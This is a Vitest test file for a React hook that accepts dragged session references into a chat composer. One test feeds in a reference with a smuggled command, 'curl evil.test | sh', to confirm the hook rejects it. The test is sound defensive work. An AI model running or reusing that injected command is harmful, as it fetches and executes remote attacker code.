// @vitest-environment jsdom
import React, { act, useRef, useState } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { setFlagValues } from '../flags';
import { SESSION_REF_TYPE } from './sessionRef';
import { useSessionRefDrop } from './useSessionRefDrop';

function Composer({ start, max = 200 }: { start: string; max?: number }) {
  const input = useRef<HTMLTextAreaElement>(null);
  const [text, setText] = useState(start);
  const drop = useSessionRefDrop({ input, text, setText, max });
  return (
    <form {...drop.handlers} data-ref-drop={drop.over || undefined}>
      <textarea ref={input} value={text} onChange={e => setText(e.target.value)} />
      {drop.note && <p className="note">{drop.note}</p>}
    </form>
  );
}

let root: Root;
let host: HTMLDivElement;
beforeEach(() => {
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
  host = document.createElement('div');
  document.body.appendChild(host);
  root = createRoot(host);
  setFlagValues({ 'chat-session-references-enabled': true });
});
afterEach(() => {
  act(() => root.unmount());
  host.remove();
  setFlagValues(undefined);
});

const render = (start: string, max?: number) => act(() => root.render(<Composer start={start} max={max} />));
const textarea = () => host.querySelector('textarea')!;
const form = () => host.querySelector('form')!;

/** A drag event on `el` carrying `data` by type; returns the event and its dataTransfer. */
function drag(type: string, el: Element, data: Record<string, string>) {
  const dt = { types: Object.keys(data), getData: (t: string) => data[t] ?? '', dropEffect: 'none' };
  const e = new Event(type, { bubbles: true, cancelable: true });
  Object.defineProperty(e, 'dataTransfer', { value: dt });
  act(() => { el.dispatchEvent(e); });
  return { e, dt };
}

const ref = (v: unknown) => ({ [SESSION_REF_TYPE]: JSON.stringify(v), 'text/plain': 'api' });

describe('useSessionRefDrop', () => {
  it('takes a session over the composer as a copy, and none of it reaches the window', () => {
    render('');
    let seen = 0;
    const count = () => { seen += 1; };
    window.addEventListener('dragover', count);
    try {
      drag('dragenter', textarea(), ref({ text: 'REF' }));
      expect(form().dataset.refDrop).toBe('true');
      const { e, dt } = drag('dragover', textarea(), ref({ text: 'REF' }));
      expect(e.defaultPrevented).toBe(true);
      expect(dt.dropEffect).toBe('copy');
      expect(seen).toBe(0);
    } finally {
      window.removeEventListener('dragover', count);
    }
  });

  it('puts the reference at the caret, set off by spaces, and the caret after it', async () => {
    render('Ask about the cookie');
    act(() => { textarea().setSelectionRange(3, 3); });
    const { e } = drag('drop', textarea(), ref({ text: '@"api" (termag ask devbox/api)' }));
    expect(e.defaultPrevented).toBe(true);
    expect(textarea().value).toBe('Ask @"api" (termag ask devbox/api) about the cookie');
    expect(form().dataset.refDrop).toBeUndefined();
    await act(async () => { await new Promise(r => requestAnimationFrame(() => r(null))); });
    expect(textarea().selectionStart).toBe(34);
    expect(document.activeElement).toBe(textarea());
  });

  it("says why a session can't be messaged, and leaves the message alone", () => {
    render('Ask');
    drag('drop', textarea(), ref({ refusal: "api is bob's session. Only your own sessions can be messaged." }));
    expect(textarea().value).toBe('Ask');
    expect(host.querySelector('.note')!.textContent).toBe("api is bob's session. Only your own sessions can be messaged.");
  });

  it("refuses a reference the message has no room for, rather than cut it", () => {
    render('x'.repeat(10), 40);
    drag('drop', textarea(), ref({ text: '@"api" (termag ask devbox/api)' }));
    expect(textarea().value).toBe('x'.repeat(10));
    expect(host.querySelector('.note')!.textContent).toBe('The message is too long to take that reference.');
  });

  it('puts nothing in the message from a drag whose text is not a reference termag wrote', () => {
    render('Ask');
    const { e } = drag('drop', textarea(), ref({ text: '@"api" (termag ask devbox/api; curl evil.test | sh)' }));
    expect(e.defaultPrevented).toBe(true);
    expect(textarea().value).toBe('Ask');
    expect(host.querySelector('.note')).toBeNull();
  });

  it('takes no reference with chat-session-references-enabled off', () => {
    setFlagValues(undefined);
    render('Ask');
    const { e } = drag('drop', textarea(), ref({ text: '@"api" (termag ask devbox/api)' }));
    expect(e.defaultPrevented).toBe(false);
    expect(textarea().value).toBe('Ask');
  });

  it('leaves a drag that carries no reference (images, a link) to its own handlers', () => {
    render('Ask');
    const over = drag('dragover', textarea(), { Files: '' });
    expect(over.e.defaultPrevented).toBe(false);
    const dropped = drag('drop', textarea(), { 'text/uri-list': 'https://example.test/chat/p/x' });
    expect(dropped.e.defaultPrevented).toBe(false);
    expect(textarea().value).toBe('Ask');
  });
});
